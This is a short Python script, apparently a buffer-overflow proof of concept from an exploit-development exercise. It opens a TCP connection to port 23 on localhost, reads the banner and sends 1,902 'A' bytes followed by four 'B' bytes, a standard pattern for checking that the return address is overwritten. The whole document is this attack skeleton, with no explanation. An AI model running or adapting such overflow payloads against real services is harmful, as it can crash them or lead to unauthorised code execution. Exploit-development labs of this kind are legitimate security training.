import socket,sys

payload = "A" * 1902 + "B" * 4

try: 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',23))
    s.recv(1024)
    s.send(payload)
    s.close()
except:
    print("[X] Connection error")
    sys.exit()